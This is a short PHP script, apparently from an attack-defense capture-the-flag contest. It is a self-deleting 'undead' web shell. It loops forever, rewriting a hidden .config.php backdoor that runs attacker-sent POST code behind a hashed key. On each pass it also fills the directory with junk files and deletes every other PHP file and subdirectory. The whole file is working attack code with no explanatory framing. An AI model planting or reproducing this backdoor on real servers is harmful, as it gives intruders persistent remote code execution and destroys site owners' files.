<?php
# ?k=xq17
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.config.php';
$code = '<?php if(substr(md5(@$_REQUEST["k"]),25)=="8aa1b46"){@eval($_POST[a]);} ?>';
$base64 = "SGVsbG8sIGhha2NlciwgMzYwdGVhbQ==";
while (True){
    file_put_contents(mt_rand().md5(mt_rand()),$base64);
    file_put_contents(mt_rand().md5(mt_rand()),$base64);
    file_put_contents(mt_rand().md5(mt_rand()),$base64);
    file_put_contents(mt_rand().md5(mt_rand()),$base64);
    is_dir($file)?rmdir($file):file_put_contents($file,$code);
     #删除指定目录下的php文件
    array_map('unlink', array_filter(glob('./*.php'), 'is_file'));
    array_map('rmdir', array_filter(glob('./*'), 'is_dir'));
}
?>